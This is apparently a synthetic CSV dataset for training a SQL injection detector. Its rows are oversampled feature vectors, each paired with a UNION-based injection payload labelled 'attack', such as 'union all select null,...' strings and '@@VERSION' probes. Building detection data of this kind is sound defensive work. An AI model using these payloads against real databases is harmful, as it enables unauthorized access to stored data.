id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000266,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.055188637006529,69.99050189954038,15.028494301378874,3.0556596156891347,49.658068383453525,1.3704259179253526,7.962007598161502,11.0,0.7094285076324488,0.01965617233027625,0.11375083160972715,0.1571644884275478,-5.551115123125783e-17,0.0,2.0094981004596244,0.0,0.0,0.0,0.0,0.9905018995403756,0.0,0.0,8.0,2.0094981004596244,0.0,0.0,1.0,0.0,0.0,0.0,0.9905018995403756,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000267,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,0.002186889993161988,73.0,32.98897714228271,4.399822182504393,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000268,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,2.2462369296330524,74.0461911908199,32.47690440459005,4.398374062063706,43.0461911908199,2.4769044045900532,17.0,11.523095595409947,0.5812661053726789,0.03354802702513501,0.2296282647956277,0.1555576028065584,-5.551115123125783e-17,0.0,2.0,0.0,1.5230955954099465,1.0,0.0,0.0,0.0,0.0,1.0,6.0461911908198935,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.47690440459005334,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.476904404590053
SMOTE_000269,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.2996144011392181,73.0,25.39824019134097,4.03303540512562,41.17067436771756,8.601759808659027,15.113782911811708,8.113782911811706,0.5639818406536652,0.11783232614601408,0.20703812207961242,0.1111477111207083,0.9431085440941467,0.0,2.0,0.0,0.05689145590585318,1.0,0.0,0.9431085440941468,0.0,0.0,1.9431085440941467,4.056891455905854,0.9431085440941468,0.0,1.0,0.0,0.0,1.0,0.9431085440941469,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.05689145590585318,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.056891455905853
SMOTE_000270,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,2.1716605056241205,61.87297142678647,21.563514286606765,3.808868873970664,13.999999999999998,24.0,14.0,9.872971426786469,0.2263279729443116,0.38799081076167696,0.22632797294431156,0.1593532433496998,-5.551115123125783e-17,1.0,1.8729714267864697,0.0,0.0,0.0,0.0,2.0,0.43648571339323494,0.0,4.0,1.8729714267864694,0.0,1.0,0.4364857133932349,0.5635142866067652,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,1.1734830070522533,61.09226605341912,20.52306651335478,3.791742762681823,13.999999999999998,24.953866973290438,11.615332566773898,10.52306651335478,0.22993023816800354,0.41150915845172836,0.18657264847298352,0.1719879549072845,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,1.5230665133547796,0.7615332566773898,0.0,4.23846674332261,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7615332566773898,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000019,1.0605086891513005,76.42913255331734,22.928739765995203,3.737772034027251,18.107283138329336,35.28582651066347,12.21456627665867,10.821456627665867,0.2367560692819411,0.4648786143611777,0.15565780133046891,0.1427075150264122,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.821456627665867,0.0,0.821456627665867,0.0,0.0,5.178543372334133,3.8214566276658672,0.0,1.0,1.0,0.0,0.0,0.821456627665867,0.821456627665867,0.0,0.0,0.0,0.0,1.0,1.0,0.821456627665867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.821456627665867
SMOTE_000273,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,2.155998471117225,73.915491285537,32.5422543572315,4.39859270285169,42.915491285537,2.542254357231501,17.0,11.4577456427685,0.5805260693792962,0.034490976113477345,0.23003409098554722,0.15494886352167916,-5.551115123125783e-17,0.0,2.0,0.0,1.4577456427685,1.0,0.0,0.0,0.0,0.0,1.0,5.915491285537,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.5422543572315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.542254357231499
SMOTE_000274,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.9826654418794845,74.00164668040222,17.53814486915342,3.271775077215583,38.92535694209538,6.844950502782998,16.769484104677264,11.46185513084658,0.4990846984389612,0.11831103975344154,0.2288911272509355,0.15371313455666175,1.0,0.0,0.3076289738306841,0.0,0.0,0.0,0.0,2.6923710261693157,0.0,0.0,6.46185513084658,0.3076289738306839,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000019,0.41076504034906103,79.53942843456755,24.06579593791892,3.800042159390527,20.447510634216247,34.22350967618915,14.06579593791892,10.80261218624324,0.2588273476850199,0.4285036558990924,0.17700542413519996,0.13566357228068768,0.0657959379189203,0.9342040620810793,2.9342040620810796,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.8026121862432385,4.0,0.06579593791892047,0.9342040620810793,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0657959379189204,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0657959379189204
SMOTE_000276,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,0.18116757079627932,56.425957721738705,20.96127657075103,3.715231171559429,13.999999999999998,20.154893716995893,14.154893716995893,8.116170287746918,0.24841060551590038,0.35718414011647015,0.25072245203822713,0.1436828023294024,1.0,0.0,1.0774468584979457,0.0,0.0,0.0,0.0,2.038723429248973,0.0,0.0,3.0387234292489733,1.0774468584979462,1.0,0.0,0.038723429248972985,0.9612765707510269,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000277,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,1.8566737843723116,68.04499752369733,20.0,3.655253719554691,13.999999999999998,29.573320126385795,13.12334488941243,11.348332507899112,0.20583582828747066,0.4324802788697467,0.19497956336121125,0.16670432948157138,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.9550024763026639,0.0,0.0,5.393330031596448,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.6516674921008879,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000278,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,0.16094078497055073,64.68414578810088,20.936829157620174,3.6395787764068106,13.999999999999998,35.7473166304807,3.999999999999999,10.936829157620174,0.21662152698366094,0.5524325405901018,0.06189186485247454,0.16905406757376273,-5.551115123125783e-17,1.0,1.063170842379825,0.0,0.0,0.0,0.0,0.0,0.9684145788100875,0.0,6.936829157620175,1.063170842379825,0.0,1.0,0.03158542118991248,0.9684145788100875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000279,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.6672689269480667,73.70846737492623,32.0,4.381246794190906,42.70846737492623,2.645766312536887,17.0,11.354233687463115,0.5793538792004955,0.035984573276787946,0.23067690495456694,0.15398464256814956,-5.551115123125783e-17,0.0,2.0,0.0,1.354233687463114,1.0,0.0,0.0,0.0,0.0,1.0,5.708467374926228,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.645766312536886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.645766312536886
SMOTE_000280,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,0.04918093011834857,71.84668816491197,16.0,3.0372855821659206,53.88501612368398,1.0,3.999999999999999,12.961672041227992,0.75,0.01392691265751192,0.05570765063004765,0.18036543671244043,1.0,0.0,1.980836020613996,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.971254030920996,1.980836020613996,1.0,0.0,0.990418010306998,0.009581989693001947,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,0.9680344392251888,56.89981523296689,19.379963046593378,3.660208655698426,13.999999999999998,29.519852186373512,3.999999999999999,9.379963046593378,0.24710561866810168,0.5175935786650265,0.07060160533374334,0.16469919733312832,-5.551115123125783e-17,1.0,2.620036953406623,0.0,0.0,0.0,0.0,0.0,0.1899815232966886,0.0,5.379963046593377,2.6200369534066223,0.0,1.0,0.8100184767033114,0.1899815232966887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,1.1123321513564142,69.71670753769197,20.28329246230803,3.663979229996493,13.999999999999998,40.0,3.999999999999999,11.716707537691972,0.20082113757190734,0.573774678776878,0.05737746787768781,0.16802671577352676,1.0,0.0,2.4334150753839436,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,2.433415075383943,1.0,0.0,0.7167075376919717,0.2832924623080284,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,1.2000309838382268,71.2222603067596,20.308637743693378,3.643003305814081,13.999999999999998,38.76544902522649,6.765449025226488,11.691362256306622,0.19727408642523195,0.5446471550096417,0.09373495746625433,0.16434380109887212,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.691362256306622,0.30863774369337804,0.0,7.691362256306622,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.691362256306622,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,2.8976623148921505,76.0683496873232,26.315007008852803,4.020152835724884,40.5616643303824,6.369985982294393,18.506685356940814,10.630014017705609,0.5346231436537096,0.08568387491807905,0.2414319838607587,0.1382609975674527,1.8766713392352026,0.0,2.0,0.0,0.4383356696176014,1.0,0.0,1.4383356696176013,0.0,0.0,1.5616643303823987,4.438335669617602,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.4383356696176014,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.438335669617602
SMOTE_000285,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,1.2095887078110954,61.0,20.47543957444094,3.6515993374826534,13.999999999999998,20.95087914888188,17.04912085111812,9.0,0.22950819672131148,0.34345703522757176,0.27949378444455936,0.14754098360655737,-5.551115123125783e-17,0.2377197872204701,2.52456042555906,0.0,0.0,0.0,0.0,2.76228021277953,0.0,0.0,3.2377197872204704,2.5245604255590597,0.0,0.2377197872204701,0.76228021277953,0.23771978722047005,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000286,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,2.7760737054388764,59.73953979467046,22.420153401776513,3.8430990604612667,20.3023010266477,17.697698973352296,14.840306803553027,6.899232991117433,0.34315624802151595,0.2933325840312038,0.24898393383022843,0.11452723411705179,-5.551115123125783e-17,1.0,0.5798465982234864,0.0,0.0,0.42015340177651356,0.0,1.5798465982234864,0.0,0.0,2.319386392893946,1.0,0.0,1.0,0.0,1.0,0.0,0.42015340177651356,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.42015340177651356,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4201534017765134
SMOTE_000287,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,2.6736606579307893,73.0,27.80568816328417,4.16365603882404,42.40284408164209,5.726697142835134,15.93522938776139,8.93522938776139,0.5808608778307135,0.0784479060662347,0.21829081353097796,0.12240040257207382,0.5323853061193048,0.0,2.0,0.0,0.9352293877613905,1.0,0.0,0.5323853061193047,0.0,0.0,1.5323853061193047,4.467614693880695,0.5323853061193047,0.0,1.0,0.0,0.0,1.0,0.5323853061193047,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.4676146938806952,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.467614693880695
SMOTE_000288,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,1.0338775215872222,67.48783815232328,23.425096614949506,3.8798965974724737,36.27528984484852,9.0,14.212548307474753,8.0,0.5369644654272909,0.1335843621064945,0.21070951726044165,0.1187416552057729,0.21254830747475364,0.7874516925252462,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.787451692525246,3.212548307474754,0.21254830747475373,0.7874516925252462,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2125483074747536,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2125483074747536
SMOTE_000289,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,1.7675141429464165,68.90119671245046,18.732535525033033,3.475841008048596,22.872251324768765,16.71207926893994,18.0,11.316866118741741,0.3250509271693316,0.24904530564714075,0.26165987715720546,0.16424389002632217,0.6831338812582586,0.31686611874174164,2.6831338812582586,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.633732237483483,2.6831338812582586,0.6831338812582584,0.31686611874174164,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.572076003929379,71.19635028004359,15.099695856670298,3.052793005891227,50.0,1.0,8.99695856670299,11.199391713340598,0.7038645445989234,0.014077290891978456,0.1247763584370837,0.15728180607201436,0.09969585667029884,0.0,1.8006082866594022,0.0,0.0,0.0,0.0,1.1993917133405978,0.0,0.0,8.0,1.8006082866594022,0.0996958566702989,0.0,0.9003041433297011,0.0996958566702989,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,2.217937670589674,62.644435150009556,23.0,3.8734750980072663,32.48332636250717,9.0,14.838891212497611,6.322217575004779,0.5175925573863999,0.14425289541533803,0.23885703446309,0.09929751273517214,-5.551115123125783e-17,1.0,1.1611087875023893,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.741663181253584,2.161108787502389,0.0,1.0,0.5805543937511946,0.41944560624880545,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000292,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,0.5696309358103748,64.18228777411629,21.13628537098062,3.684581733436734,13.999999999999998,34.909717032155044,4.545141483922478,10.727429258038761,0.21836974476202664,0.5430428284802846,0.07163104181447091,0.16695638494321782,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.13628537098061955,0.8637146290193807,0.0,6.727429258038761,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.1362853709806195,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,3.081119002741591,77.38307395536079,30.093540835711373,4.221538939084629,42.09354083571137,2.4766147910721568,19.85968874643294,12.953229582144314,0.5453600514404131,0.03182999356994837,0.2556607331235562,0.16714922186608236,1.4298443732164698,0.0,2.0,0.0,1.5233852089278435,1.0,0.0,0.9532295821443132,0.0,0.0,1.0,6.0467704178556865,0.47661479107215665,0.0,1.0,0.0,0.0,1.0,0.4766147910721567,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000294,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.349065612971777,73.0,32.0,4.369424805589289,42.63864941344597,2.6806752932770177,17.0,10.680675293277018,0.5840910878554242,0.03672157935995912,0.2328767123287671,0.14631062045584953,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.680675293277017,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.680675293277017
SMOTE_000295,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,0.483429899527576,62.79154900242527,20.895774501212635,3.8080740382693663,13.999999999999998,23.583098004850545,14.416901995149455,10.791549002425272,0.22298160654854182,0.3754197237177668,0.2298160654854181,0.17178260424827327,-5.551115123125783e-17,0.8957745012126364,3.0,0.0,0.0,0.0,0.0,2.1042254987873634,0.8957745012126367,0.0,3.8957745012126366,3.0,0.0,0.8957745012126364,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,2.390228631584661,66.76581400935699,16.585930230409346,3.2117741039593106,42.96883723508784,1.0,12.140697695906532,10.656279078362612,0.6500770803156258,0.015512671165209713,0.17459768268639153,0.15981256583277298,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8281395391813064,0.5859302304093469,0.0,6.24220930877196,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
